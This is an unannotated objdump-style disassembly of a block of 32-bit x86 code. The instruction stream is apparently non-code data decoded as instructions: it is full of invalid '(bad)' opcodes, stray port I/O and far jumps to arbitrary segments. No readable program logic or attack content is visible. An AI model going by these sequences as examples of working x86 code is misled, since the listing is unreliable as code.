  41df45:	rcr    ecx,cl
  41df47:	cmp    al,0x54
  41df49:	pop    eax
  41df4a:	jmp    0x408b:0x4ca50dc2
  41df51:	test   BYTE PTR [edi-0x7f],cl
  41df54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41df55:	pop    ebp
  41df56:	(bad)  
  41df57:	pushf  
  41df58:	aas    
  41df59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41df5a:	mov    ebx,0xac9c7d92
  41df5f:	mov    dl,0x35
  41df61:	scas   eax,DWORD PTR es:[edi]
  41df62:	push   ebp
  41df63:	dec    ebx
  41df64:	pop    ds
  41df65:	xor    al,0xe8
  41df67:	bound  ebx,QWORD PTR [eax+0x20]
  41df6a:	cmp    DWORD PTR [ebx+0x4bd86ce],eax
  41df70:	clc    
  41df71:	stos   DWORD PTR es:[edi],eax
  41df72:	in     al,0xd9
  41df74:	sub    cl,dh
  41df76:	imul   eax,DWORD PTR [eax],0x79
  41df79:	push   0x1388fcf2
  41df7e:	pop    ecx
  41df7f:	(bad)  
  41df81:	push   0x4
  41df83:	cmp    ah,ah
  41df85:	ja     0x41df28
  41df87:	mov    ch,0x5
  41df89:	imul   BYTE PTR [edx]
  41df8b:	lods   eax,DWORD PTR ds:[esi]
  41df8c:	pop    ecx
  41df8e:	jmp    0xfcd7:0x16690370
  41df95:	pop    ecx
  41df96:	mov    bl,0x15
  41df98:	xor    al,0xbd
  41df9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41df9b:	lahf   
  41df9c:	jg     0x41e011
  41df9e:	aam    0x96
  41dfa0:	xchg   ebp,eax
  41dfa1:	je     0x41dff9
  41dfa3:	mov    esi,ds
  41dfa5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dfa6:	arpl   WORD PTR [edx-0x67],cx
  41dfa9:	fsubr  QWORD PTR [edi+0x17]
  41dfac:	inc    ebp
  41dfad:	mov    eax,0x9928ef53
  41dfb2:	jecxz  0x41df6a
  41dfb4:	mov    bl,0x2e
  41dfb6:	xor    DWORD PTR [edi+edx*4],edi
  41dfb9:	inc    ebx
  41dfba:	shl    BYTE PTR [edx+esi*4],0xb9
  41dfbe:	dec    esi
  41dfbf:	scas   al,BYTE PTR es:[edi]
  41dfc0:	cs jecxz 0x41dfb3
  41dfc3:	add    eax,0x80c3af19
  41dfc8:	mov    bh,0x9f
  41dfca:	sub    al,al
  41dfcc:	test   eax,0x8170e944
  41dfd1:	es xchg ecx,eax
  41dfd3:	mov    bh,0xbe
  41dfd5:	in     al,0x4f
  41dfd7:	jmp    0xfb62:0xec00f92b
  41dfde:	cmp    BYTE PTR [eax+0x75b1427],al
  41dfe4:	out    dx,al
  41dfe5:	test   dl,dl
  41dfe7:	arpl   WORD PTR [ebp+0x20],di
  41dfea:	fmul   DWORD PTR [esi+0xa9e242d]
  41dff0:	lock call DWORD PTR ds:0xfc1d7e6
  41dff7:	adc    DWORD PTR [eax-0x3fea17bc],0xffffffca
  41dffe:	lea    ebx,[ebx-0x15]
  41e001:	outs   dx,DWORD PTR ds:[esi]
  41e002:	cmp    edx,DWORD PTR [ecx-0x772e802e]
  41e008:	push   edi
  41e009:	cmp    edx,ecx
  41e00b:	push   ebp
  41e00c:	sbb    al,ah
  41e00e:	xchg   edi,eax
  41e00f:	xchg   BYTE PTR [edx-0xb],cl
  41e012:	inc    edx
  41e014:	mov    ebp,0x50866c7c
  41e019:	mov    ebp,0xcf95a26f
  41e01e:	idiv   DWORD PTR [eax+0x34e66e03]
  41e024:	leave  
  41e025:	scas   eax,DWORD PTR es:[edi]
  41e026:	xchg   ebp,eax
  41e027:	mov    dl,0x2b
  41e029:	loopne 0x41e059
  41e02b:	mov    ebx,0x3da763d5
  41e030:	pop    edi
  41e031:	jns    0x41e03c
  41e033:	int    0x8d
  41e035:	adc    DWORD PTR [edx+0x32e8ea63],ebx
  41e03b:	push   0xcdbcc23d
  41e040:	aam    0x53
  41e042:	in     eax,0xb9
  41e044:	imul   ebp,DWORD PTR [ebx],0x8fe0e683
  41e04a:	cld    
  41e04b:	lods   eax,DWORD PTR ds:[esi]
  41e04c:	or     eax,0xaad792f9
  41e051:	sub    eax,0x18704ffb
  41e056:	scas   al,BYTE PTR es:[edi]
  41e057:	ins    BYTE PTR es:[edi],dx
  41e058:	xchg   edx,eax
  41e059:	int    0x61
  41e05b:	xchg   edi,eax
  41e05c:	out    0x68,al
  41e05e:	(bad)  
  41e05f:	dec    edx
  41e060:	push   ebx
  41e061:	xor    eax,0xd41d9374
  41e066:	xor    cl,dl
  41e068:	push   esp
  41e069:	cvtdq2ps xmm7,XMMWORD PTR [ecx+0x45]
  41e06d:	enter  0x1be8,0x9
  41e071:	add    esp,DWORD PTR [esi]
  41e073:	cmovnp ebx,edx
  41e076:	xchg   esp,eax
  41e077:	jp     0x41e050
  41e079:	adc    al,0xad
  41e07b:	sbb    ebp,DWORD PTR [ebx-0x3e]
  41e07e:	xlat   BYTE PTR ds:[ebx]
  41e07f:	jo     0x41e0cf
  41e081:	stos   DWORD PTR es:[edi],eax
  41e082:	inc    ebx
  41e083:	aam    0x21
  41e085:	adc    eax,0xce8b0030
  41e08a:	int3   
  41e08b:	imul   esp,DWORD PTR [ebp+0x6f],0x19
  41e08f:	add    BYTE PTR [edi],0x81
  41e092:	rol    DWORD PTR [ebx-0x56b3fe29],0x1a
  41e099:	fldenv [edx-0x7fdca986]
  41e09f:	push   esp
  41e0a0:	xchg   BYTE PTR [ecx-0x4bcbc40c],dh
  41e0a6:	sub    eax,0x4f5c1541
  41e0ab:	push   edx
  41e0ac:	mov    esi,0x1eee7de1
  41e0b1:	fsubr  QWORD PTR [eax]
  41e0b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e0b4:	push   edx
  41e0b5:	repnz sahf 
  41e0b7:	shl    BYTE PTR [ebx],1
  41e0b9:	jns    0x41e0f0
  41e0bb:	sbb    ebp,DWORD PTR [edx+edi*4+0x779a10cd]
  41e0c2:	leave  
  41e0c3:	sbb    al,0x7c
  41e0c5:	jae    0x41e072
  41e0c7:	jmp    0x41e075
  41e0c9:	pushf  
  41e0ca:	ret    0x790f
  41e0cd:	pop    ds
  41e0ce:	inc    ecx
  41e0cf:	xchg   ebx,eax
  41e0d0:	xchg   edx,eax
  41e0d1:	call   0xf882:0x6ef05b95
  41e0d8:	nop
  41e0d9:	jmp    0x41e0ae
  41e0db:	ficomp DWORD PTR [edx]
  41e0dd:	std    
  41e0de:	fadd   st(3),st
  41e0e0:	xlat   BYTE PTR ds:[ebx]
  41e0e1:	sti    
  41e0e2:	sbb    eax,0xcc790fa5
  41e0e7:	in     eax,dx
  41e0e8:	add    DWORD PTR [eax+0x30367866],ebx
  41e0ee:	dec    esp
  41e0ef:	and    cl,bl
  41e0f1:	pusha  
  41e0f2:	jle    0x41e167
  41e0f4:	aaa    
  41e0f5:	mov    eax,DWORD PTR [eax-0x5ea764ee]
  41e0fb:	clc    
  41e0fc:	scas   eax,DWORD PTR es:[edi]
  41e0fd:	add    eax,0x76a6c79a
  41e102:	adc    DWORD PTR [ecx-0x4a],ebx
  41e105:	cs jae 0x41e097
  41e108:	jae    0x41e0c6
  41e10a:	inc    eax
  41e10b:	inc    ebp
  41e10c:	add    eax,0x92c839ea
  41e111:	xchg   edx,eax
  41e112:	sbb    eax,0xcc4effc5
  41e117:	adc    eax,0xb27b8319
  41e11c:	cmp    eax,0x9d894f43
  41e121:	dec    ebp
  41e122:	test   bh,dh
  41e124:	outs   dx,DWORD PTR fs:[esi]
  41e126:	popf   
  41e127:	fwait
  41e128:	xchg   ebp,eax
  41e129:	mov    edx,esi
  41e12b:	jle    0x41e129
  41e12d:	lds    edx,FWORD PTR [ebp+0x1a]
  41e130:	or     esi,DWORD PTR [edx-0x1e]
  41e133:	(bad)  
  41e134:	shr    DWORD PTR [esi],0x7e
  41e137:	adc    esp,ebx
  41e139:	sub    eax,0xa0742e32
  41e13e:	xor    eax,0x5bb0ef50
  41e143:	sub    edi,ecx
  41e145:	adc    esp,0xffffff99
  41e148:	out    0xf6,eax
  41e14a:	(bad)  
  41e14b:	hlt    
  41e14c:	dec    ebx
  41e14d:	push   edx
  41e14e:	shld   DWORD PTR [edi-0x4f],esp,0x46
  41e153:	sub    BYTE PTR [ebx+0x20],0x82
  41e157:	add    bh,0xc6
  41e15a:	rol    DWORD PTR [ebp-0x3d810e65],1
  41e160:	add    al,0xd5
  41e162:	mov    bl,0xd0
  41e164:	adc    bh,dl
  41e166:	aaa    
  41e167:	dec    edx
  41e168:	aad    0xa2
  41e16a:	or     ah,BYTE PTR [esi]
  41e16c:	stc    
  41e16d:	icebp  
  41e16e:	enter  0x6572,0x24
  41e172:	or     DWORD PTR [eax],ebp
  41e174:	pop    ds
  41e175:	inc    esi
  41e176:	in     eax,0x16
  41e178:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e179:	shl    DWORD PTR [esi+0x54],0x48
  41e17d:	pop    ecx
  41e17e:	or     al,0xc8
  41e180:	inc    eax
  41e181:	outs   dx,BYTE PTR ds:[esi]
  41e182:	(bad)  
  41e183:	adc    ch,BYTE PTR gs:[ebp+ecx*8-0x1ffff087]
  41e18b:	test   al,0xc9
  41e18d:	lods   eax,DWORD PTR ds:[esi]
  41e18e:	mov    ebp,0x96f9143b
  41e193:	sub    al,0xab
  41e195:	call   0xa618a12c
  41e19a:	dec    ebp
  41e19b:	push   esp
  41e19c:	xchg   edx,eax
  41e19d:	mov    ds:0x41db1c01,eax
  41e1a2:	jecxz  0x41e19b
  41e1a4:	js     0x41e1af
  41e1a6:	repz and DWORD PTR [edx-0x5b394d0c],eax
  41e1ad:	or     ah,bh
  41e1af:	test   BYTE PTR [eax+0x22],ah
  41e1b2:	cld    
  41e1b3:	or     ebx,esp
  41e1b5:	dec    esi
  41e1b6:	lods   eax,DWORD PTR ds:[esi]
  41e1b7:	dec    esp
  41e1b8:	ins    DWORD PTR es:[edi],dx
  41e1b9:	push   cs
  41e1ba:	or     edi,eax
  41e1bc:	mov    eax,0xe8226646
  41e1c1:	mov    eax,0xa67a58bf
  41e1c6:	add    al,0x2d
  41e1c8:	fisub  DWORD PTR [ebx-0x358164a4]
  41e1ce:	xchg   ecx,eax
  41e1cf:	iret   
  41e1d0:	xacquire xchg DWORD PTR [eax-0x80],edi
  41e1d4:	ss xchg edx,eax
  41e1d6:	in     al,0xd4
  41e1d8:	push   ds
  41e1d9:	(bad)  
  41e1da:	jmp    0x41e1fb
  41e1dc:	mov    ebp,ecx
  41e1de:	xchg   BYTE PTR [ebx+0x27e02618],bh
  41e1e4:	push   edi
  41e1e5:	mov    ds:0x5d81edd1,al
  41e1ea:	push   ebx
  41e1eb:	ror    DWORD PTR [ebx-0x65],0x33
  41e1ef:	push   ebx
  41e1f0:	add    BYTE PTR [ebx-0x30],dl
  41e1f3:	int    0x9d
  41e1f5:	(bad)  
  41e1f6:	cli    
  41e1f7:	fdivr  st,st(5)
  41e1f9:	dec    ebx
  41e1fa:	sbb    al,0x0
  41e1fc:	push   es
  41e1fd:	loop   0x41e1a3
  41e1ff:	lods   eax,DWORD PTR ds:[esi]
  41e200:	xor    al,0x55
  41e202:	call   0xd2f344a5
  41e207:	cmp    DWORD PTR [esi],ecx
  41e209:	mov    esi,0x7902aa97
  41e20e:	ret    
  41e20f:	lahf   
  41e210:	jne    0x41e1d3
  41e212:	mov    dh,0xbf
  41e214:	repnz ins BYTE PTR es:[edi],dx
  41e216:	cwde   
  41e217:	and    al,0xbd
  41e219:	imul   ebp,DWORD PTR [edx],0xffffffe2
  41e21c:	mov    dh,0x8e
  41e21e:	inc    ebx
  41e21f:	adc    bl,BYTE PTR [ecx-0x2c]
  41e222:	bnd jl 0x41e1ac
  41e225:	xor    al,0xb0
  41e227:	pop    ebx
  41e228:	test   eax,0x278a5be3
  41e22d:	jecxz  0x41e251
  41e22f:	mov    al,0x1f
  41e231:	xor    eax,0x6af6afca
  41e236:	inc    ebx
  41e237:	and    BYTE PTR [esi],dh
  41e239:	fimul  DWORD PTR ds:0xb3cdd901
  41e23f:	icebp  
  41e240:	das    
  41e241:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e242:	mov    ecx,0x4d04afa2
  41e248:	(bad)  
  41e249:	jno    0x41e296
  41e24b:	aas    
  41e24c:	das    
  41e24d:	ror    dh,cl
  41e24f:	lahf   
  41e250:	sbb    ch,BYTE PTR [ebx+edi*8+0x45c2bb43]
  41e257:	das    
  41e258:	rcr    BYTE PTR ds:0x58e4f448,cl
  41e25e:	das    
  41e25f:	adc    al,0xef
  41e261:	(bad)  
  41e265:	in     eax,0x1b
  41e267:	fnstenv [ebx]
  41e269:	mov    ax,0x3b7d
  41e26d:	stos   DWORD PTR es:[edi],eax
  41e26e:	pop    ss
  41e26f:	add    eax,0x442ea3b4
  41e274:	inc    ecx
  41e275:	enter  0xc437,0x7b
  41e279:	xor    esp,0x1360f6d0
  41e27f:	jne    0x41e282
  41e281:	adc    bh,BYTE PTR [esi]
  41e283:	popf   
  41e284:	inc    edx
  41e285:	xchg   BYTE PTR [edi],cl
  41e287:	scas   al,BYTE PTR es:[edi]
  41e288:	into   
  41e289:	xchg   cl,bl
  41e28b:	mov    esi,0xfab71aed
  41e290:	test   DWORD PTR [ecx-0x13],0x6182cf90
  41e297:	jge    0x41e2d0
  41e299:	mov    ch,0xa9
  41e29b:	int3   
  41e29c:	ret    
  41e29d:	add    BYTE PTR [esi+0x3832abcd],0x3f
  41e2a4:	fmul   QWORD PTR [esp+ecx*4-0x3d]
  41e2a8:	cli    
  41e2a9:	sbb    eax,DWORD PTR [ebx]
  41e2ab:	retf   0xa364
  41e2ae:	add    eax,0xa0c1e66d
  41e2b3:	cmp    eax,0x3e5f297e
  41e2b8:	arpl   ax,bp
  41e2ba:	lock imul edi,DWORD PTR [eax-0x68],0x4d
  41e2bf:	in     eax,dx
  41e2c0:	enter  0x6527,0xc2
  41e2c4:	sbb    DWORD PTR [edx+eiz*8+0x70],0xfffffff5
  41e2c9:	les    esi,FWORD PTR [esi]
  41e2cb:	xchg   ebx,eax
  41e2cc:	jp     0x41e284
  41e2ce:	cwde   
  41e2cf:	xor    ecx,0xffffff8f
  41e2d2:	mov    al,ds:0x3eb1bdee
  41e2d7:	and    esi,DWORD PTR [ecx+0xd]
  41e2da:	fisttp QWORD PTR [esi-0x7d]
  41e2dd:	pop    es
  41e2de:	cwde   
  41e2df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e2e0:	out    dx,al
  41e2e1:	adc    BYTE PTR [ebx],bh
  41e2e3:	add    ch,BYTE PTR [esp+ebx*2-0x2a]
  41e2e7:	bound  esi,QWORD PTR [ebp+0x5]
  41e2ea:	repnz fnsave fs:[eax-0x5f4d2685]
  41e2f2:	cli    
  41e2f3:	mov    cl,0x90
  41e2f5:	gs inc eax
  41e2f7:	mov    eax,0xa7a50adc
  41e2fc:	mov    ebx,0x943e87a4
  41e301:	push   ss
  41e302:	sbb    al,0xd1
  41e304:	pop    ecx
  41e305:	imul   BYTE PTR [bp+di-0x7f]
  41e309:	clc    
  41e30a:	int    0x55
  41e30c:	jno    0x41e2a5
  41e30e:	in     eax,dx
  41e30f:	mov    bl,BYTE PTR [edi]
  41e311:	xchg   ebp,eax
  41e313:	jne    0x41e32f
  41e315:	cmp    dh,BYTE PTR [ecx+0x37]
  41e318:	aam    0x35
  41e31a:	cmp    al,0x56
  41e31c:	stos   DWORD PTR es:[edi],eax
  41e31d:	xor    eax,0xfa373315
  41e322:	and    eax,0x9d2b8f75
  41e327:	mov    eax,eax
  41e329:	push   cs
  41e32a:	add    esp,DWORD PTR [ebx+0x2a]
  41e32d:	and    eax,0x3dfad243
  41e332:	jne    0x41e319
  41e334:	cwde   
  41e335:	cli    
  41e336:	loope  0x41e385
  41e338:	inc    esp
  41e339:	or     DWORD PTR [edx-0x20f257a3],ecx
  41e33f:	pushf  
  41e340:	mov    edx,0xb6dfffa2
  41e345:	jmp    0x41e31f
  41e347:	dec    esi
  41e348:	nop
  41e349:	cmp    eax,0x31470f90
  41e34e:	push   cs
  41e34f:	fnstcw WORD PTR [eax-0x326810cc]
  41e355:	cmp    BYTE PTR [ecx],dh
  41e357:	mov    dh,0xe
  41e359:	and    ebx,DWORD PTR [ebx-0x4d]
  41e35c:	iret   
  41e35d:	mov    gs,WORD PTR [eax+0x15]
  41e360:	mov    ds:0x5f311b6d,eax
  41e365:	sub    DWORD PTR [esi-0x1f7fe001],esp
  41e36b:	mov    BYTE PTR [ebp-0x58],ah
  41e36e:	cmp    al,0xda
  41e370:	imul   eax,ebp,0xc113dc6c
  41e376:	and    BYTE PTR [ebx],dh
  41e378:	xchg   BYTE PTR [edi+0x3e11c16d],al
  41e37e:	daa    
  41e37f:	cli    
  41e380:	xchg   ebx,eax
  41e381:	inc    esp
  41e382:	outs   dx,BYTE PTR ds:[esi]
  41e383:	pop    es
  41e384:	cmp    BYTE PTR [edi*1-0x40a085bc],dh
  41e38b:	xchg   esp,eax
  41e38c:	in     eax,dx
  41e38d:	ret    0xd237
  41e390:	pop    eax
  41e391:	or     DWORD PTR [ebx-0x609028db],eax
  41e397:	mov    ebx,0x3eb97bd2
  41e39c:	sub    DWORD PTR [ebx],esp
  41e39e:	mov    eax,ds:0x185834ae
  41e3a3:	sbb    DWORD PTR [ebx-0x48],0xfffffff4
  41e3a7:	mov    eax,ds:0x338df474
  41e3ac:	add    dh,BYTE PTR [edx+0x7]
  41e3af:	int3   
  41e3b0:	mov    ?,WORD PTR [edx]
  41e3b2:	or     al,0xdf
  41e3b4:	(bad)  
  41e3b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e3b6:	aaa    
  41e3b7:	stos   BYTE PTR es:[edi],al
  41e3b8:	pop    ecx
  41e3b9:	fdiv   st(1),st
  41e3bb:	gs lock aam 0x1b
  41e3bf:	xchg   esp,eax
  41e3c0:	inc    edx
  41e3c1:	fild   WORD PTR [ebp+0x4e]
  41e3c4:	inc    esi
  41e3c5:	frstor [ecx-0x5b]
  41e3c8:	jp     0x41e405
  41e3ca:	ror    esp,0x3e
  41e3cd:	loop   0x41e372
  41e3cf:	mov    ds:0x22737d52,al
  41e3d4:	ret    
  41e3d5:	test   BYTE PTR [esi+0x605d9a30],bl
  41e3db:	cmp    DWORD PTR [ebp+0xa405f10],ebx
  41e3e1:	pusha  
  41e3e2:	jno    0x41e463
  41e3e4:	and    dh,BYTE PTR [edx-0x4e]
  41e3e7:	cmp    edi,DWORD PTR [edi+edx*2-0x66679b29]
  41e3ee:	call   DWORD PTR [edx-0x4c05710d]
  41e3f4:	lods   al,BYTE PTR ds:[esi]
  41e3f5:	or     edi,DWORD PTR [eax+eax*1+0x6d]
  41e3f9:	ins    BYTE PTR es:[edi],dx
  41e3fa:	sar    al,0xd5
  41e3fd:	pop    ebx
  41e3fe:	fild   QWORD PTR [edi-0x74518daa]
  41e404:	fs in  eax,dx
  41e406:	in     eax,0xb6
  41e408:	push   ecx
  41e409:	adc    DWORD PTR [eax+0x2f5b5ecd],ecx
  41e40f:	mov    esp,0x84687273
  41e414:	je     0x41e432
  41e416:	popa   
  41e417:	js     0x41e459
  41e419:	push   edx
  41e41a:	mov    esi,0xa373a7
  41e41f:	sub    al,0x18
  41e421:	test   DWORD PTR [ebx+0x29],esi
  41e424:	cwde   
  41e425:	arpl   WORD PTR [ebp+0x64],dx
  41e428:	inc    ecx
  41e429:	gs mov ebp,0xc45ccef3
  41e42f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e430:	push   ss
  41e431:	repnz mov al,ds:0x9c3cb18b
  41e437:	xor    dl,BYTE PTR [ebx-0x32a11a23]
  41e43d:	sub    eax,0x6fadf97b
  41e442:	push   edi
  41e443:	ins    DWORD PTR es:[edi],dx
  41e444:	jmp    0xdd6fe483
  41e449:	cli    
  41e44a:	cmp    BYTE PTR [edx-0x7f],dl
  41e44d:	mov    edi,0xb2691d29
  41e452:	mov    ds:0x854a304c,al
  41e457:	xchg   ebp,eax
  41e458:	xchg   edi,eax
  41e459:	sahf   
  41e45a:	jae    0x41e422
  41e45c:	xor    DWORD PTR [edi],eax
  41e45e:	push   0x3b75c45d
  41e463:	enter  0xba52,0x3
  41e467:	aam    0xf5
  41e469:	push   ebx
  41e46a:	test   ecx,esi
  41e46c:	ret    
  41e46d:	test   al,0x75
  41e46f:	rcl    DWORD PTR [esi-0x1b],0x85
  41e473:	outs   dx,DWORD PTR ds:[esi]
  41e474:	out    0x3b,eax
  41e476:	pop    ds
  41e477:	fmul   QWORD PTR [ecx+0x49]
  41e47a:	ret    
  41e47b:	out    0x20,al
  41e47d:	mov    edi,DWORD PTR [esp+ebx*8-0x2b]
  41e481:	pop    esp
  41e482:	add    al,0x81
  41e484:	mov    ch,0xd3
  41e486:	or     ebp,DWORD PTR es:[edx]
  41e489:	rcl    BYTE PTR [ebx+edx*1-0x23],cl
  41e48d:	loope  0x41e509
  41e48f:	mov    ebx,0x2d6c62d7
  41e494:	je     0x41e41d
  41e496:	leave  
  41e497:	ret    
  41e498:	and    eax,0x2e497fdb
  41e49d:	mov    ecx,0x3b8a7e46
  41e4a2:	sar    BYTE PTR [edx+0x2b],cl
  41e4a5:	dec    cl
  41e4a7:	mov    dh,0xe5
  41e4a9:	sbb    al,0xf1
  41e4ab:	add    BYTE PTR [esi-0x2e],ah
  41e4ae:	xchg   BYTE PTR [ebx],bl
  41e4b0:	aam    0xe7
  41e4b2:	jo     0x41e439
  41e4b4:	lds    eax,FWORD PTR [ebx]
  41e4b6:	mov    esp,0x5fdbde06
  41e4bb:	sub    BYTE PTR [edi],bh
  41e4bd:	push   0x25
  41e4bf:	leave  
  41e4c0:	pop    es
  41e4c1:	cs aam 0x44
  41e4c4:	push   edx
  41e4c5:	mov    ch,0x72
  41e4c7:	mov    fs,WORD PTR [eax]
  41e4c9:	mov    esi,0x1e0fda03
  41e4ce:	fisubr WORD PTR [esi]
  41e4d0:	fistp  DWORD PTR [ebp+0x24]
  41e4d3:	jecxz  0x41e4ea
  41e4d5:	test   BYTE PTR [edx],bh
  41e4d7:	pop    ebp
  41e4d8:	test   al,0x81
  41e4da:	retf   0x2567
  41e4dd:	leave  
  41e4de:	out    dx,eax
  41e4df:	xchg   esi,eax
  41e4e0:	lods   al,BYTE PTR ds:[esi]
  41e4e1:	test   DWORD PTR [eax],ecx
  41e4e3:	std    
  41e4e4:	xor    al,0x97
  41e4e6:	scas   al,BYTE PTR es:[edi]
  41e4e7:	sub    ebx,DWORD PTR [esp+edi*8-0x5a9f3f14]
  41e4ee:	push   edi
  41e4ef:	sub    BYTE PTR [edx+0x59],bh
  41e4f2:	cmp    edi,ebx
  41e4f4:	jl     0x41e52a
  41e4f6:	xchg   edx,eax
  41e4f7:	jmp    0x41e495
  41e4f9:	scas   eax,DWORD PTR es:[edi]
  41e4fa:	retf   
  41e4fb:	cmp    BYTE PTR [eax],ch
  41e4fd:	call   0x4933:0x55b19b6a
  41e504:	adc    cl,BYTE PTR [esi]
  41e506:	jle    0x41e551
  41e508:	xchg   ebx,eax
  41e509:	shr    cl,cl
  41e50b:	adc    eax,0x3b9f2c32
  41e510:	bnd jge 0x41e52f
  41e513:	test   edi,esi
  41e515:	loopne 0x41e4b9
  41e517:	jge    0x41e4aa
  41e519:	xchg   BYTE PTR [ecx],al
  41e51b:	out    dx,al
  41e51c:	cmp    eax,0x9b671b1
  41e521:	cdq    
  41e522:	js     0x41e54d
  41e524:	sub    edi,ebp
  41e526:	push   ebp
  41e527:	idiv   BYTE PTR [ebp-0x41]
  41e52a:	sbb    ebp,esi
  41e52c:	pop    es
  41e52d:	bound  ebp,QWORD PTR [eax]
  41e52f:	mov    al,ds:0x9e4f2b68
  41e534:	mov    ch,0x6d
  41e536:	mov    ecx,0x4d4fa0be
  41e53b:	lock adc ebx,esi
  41e53e:	mov    WORD PTR [eax+0x57],cs
  41e541:	dec    ebp
  41e542:	add    al,0x36
  41e544:	cmp    dh,bl
  41e546:	test   edx,esp
  41e548:	inc    edx
  41e549:	ret    
  41e54a:	repnz int 0xad
  41e54d:	push   0x206ed5cd
  41e552:	clc    
  41e553:	in     al,0x62
  41e555:	or     ebp,DWORD PTR [ecx-0x2a]
  41e558:	ins    DWORD PTR es:[edi],dx
  41e559:	xchg   DWORD PTR [ebp+0x1f],esi
  41e55c:	dec    edi
  41e55d:	ja     0x41e54b
  41e55f:	mov    esi,0x345e20c0
  41e564:	mov    ds:0xe9c6f010,al
  41e569:	(bad)  
  41e56a:	aaa    
  41e56b:	sbb    ebp,DWORD PTR [ecx+ebp*1]
  41e56e:	push   ebp
  41e56f:	shl    WORD PTR [edx+eiz*4+0x6095e3c4],cl
  41e577:	stos   BYTE PTR es:[edi],al
  41e578:	lahf   
  41e579:	popf   
  41e57a:	inc    eax
  41e57b:	repnz push ds
  41e57d:	imul   esi,DWORD PTR [ebx],0x68
  41e580:	sub    eax,0x937ac957
  41e585:	je     0x41e5c1
  41e587:	in     eax,0x4e
  41e589:	jmp    0x68ec:0xf8815df4
  41e590:	mov    bh,0x83
  41e592:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e593:	test   BYTE PTR [ebx+0x1a],bl
  41e596:	mov    al,0xb8
  41e598:	inc    ebp
  41e599:	aas    
  41e59a:	xor    al,ah
  41e59c:	mov    ah,0x9
  41e59e:	fimul  DWORD PTR [ecx+ebp*1-0x11]
  41e5a2:	pop    eax
  41e5a3:	popf   
  41e5a4:	addr16 pop esi
  41e5a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e5a7:	xchg   esi,eax
  41e5a8:	stos   DWORD PTR es:[edi],eax
  41e5a9:	cmp    BYTE PTR [ebx],ah
  41e5ab:	das    
  41e5ac:	rcpps  xmm6,XMMWORD PTR [ebp-0x6b910040]
  41e5b3:	mov    cl,0x3e
  41e5b5:	jmp    0x41e60c
  41e5b7:	dec    esp
  41e5b8:	ss das 
  41e5ba:	(bad)  
  41e5bb:	out    dx,al
  41e5bc:	(bad)  
  41e5bd:	sub    DWORD PTR [eax+edi*4+0x103aca32],esp
  41e5c4:	pop    ebp
  41e5c5:	cmp    DWORD PTR [ebx],eax
  41e5c7:	sub    bl,BYTE PTR [eax+eiz*2]
  41e5ca:	iret   
  41e5cb:	lock call 0x3dc09ea7
  41e5d1:	jge    0x41e584
  41e5d3:	aam    0x6
  41e5d5:	repz adc BYTE PTR [edi+0x71],dl
  41e5d9:	pop    esi
  41e5da:	aam    0xef
  41e5dc:	dec    esp
  41e5dd:	xor    al,0xca
  41e5df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e5e0:	add    bl,BYTE PTR [esi]
  41e5e2:	mov    DWORD PTR [edx],esi
  41e5e4:	dec    edx
  41e5e5:	xchg   edx,eax
  41e5e6:	mov    esi,0xf318ef43
  41e5eb:	dec    ebp
  41e5ec:	(bad)
  41e5f0:	sbb    bh,ah
  41e5f2:	icebp  
  41e5f3:	and    al,0x8c
  41e5f5:	fstp   TBYTE PTR [edx+0x69ef60d7]
  41e5fb:	sub    edx,edi
  41e5fd:	ds jns 0x41e5ad
  41e600:	jbe    0x41e5cd
  41e602:	stos   BYTE PTR es:[edi],al
  41e603:	inc    edi
  41e604:	out    dx,eax
  41e605:	aad    0xef
  41e607:	cmp    al,0x4e
  41e609:	hlt    
  41e60a:	adc    BYTE PTR [esi],dl
  41e60c:	ror    DWORD PTR [eax-0x56],cl
  41e60f:	ret    
  41e610:	mov    edx,0xe79636c5
  41e615:	shl    BYTE PTR [edx],cl
  41e617:	imul   edx,DWORD PTR [ebp-0x61],0xd569172d
  41e61e:	mov    dl,BYTE PTR [ecx-0x43]
  41e621:	pop    ecx
  41e622:	jge    0x41e66c
  41e624:	test   BYTE PTR [eax-0x2],ch
  41e627:	stos   DWORD PTR es:[edi],eax
  41e628:	ret    0xfd00
  41e62b:	push   edi
  41e62c:	pusha  
  41e62d:	sub    eax,0x35c2217d
  41e632:	push   eax
  41e633:	test   al,0xb9
  41e635:	push   edx
  41e636:	sbb    dh,BYTE PTR [eax]
  41e638:	leave  
  41e639:	mov    ah,0x6d
  41e63b:	repz xlat BYTE PTR ds:[ebx]
  41e63d:	inc    eax
  41e63e:	xor    ch,BYTE PTR [ecx]
  41e640:	pop    eax
  41e641:	pushf  
  41e642:	imul   al
  41e644:	dec    edx
  41e645:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e646:	push   ecx
  41e647:	sub    BYTE PTR [edi+0x68],dl
  41e64a:	data16 (bad) 
  41e64c:	stos   DWORD PTR es:[edi],eax
  41e64d:	mov    ebx,0xc428b252
  41e652:	mov    al,0xf4
  41e654:	sbb    bl,BYTE PTR [ecx+0x767f243b]
  41e65a:	push   esi
  41e65b:	arpl   WORD PTR [ebx+ebx*1-0x7e840142],di
  41e662:	mov    ch,0x8
  41e664:	(bad)  
  41e665:	sub    al,0xf8
  41e667:	in     eax,dx
  41e668:	hlt    
  41e669:	sub    BYTE PTR [edx],ah
  41e66b:	enter  0x311c,0xe7
  41e66f:	jno    0x41e623
  41e671:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e672:	inc    edi
  41e673:	add    eax,ebp
  41e675:	stc    
  41e676:	pop    esp
  41e677:	mov    dh,0xcd
  41e679:	test   eax,0xb363a9a6
  41e67e:	shl    DWORD PTR [ecx+edi*2-0x4e],1
  41e682:	pop    edi
  41e683:	scas   al,BYTE PTR es:[edi]
  41e684:	pop    ss
  41e685:	(bad)  
  41e686:	scas   eax,DWORD PTR es:[edi]
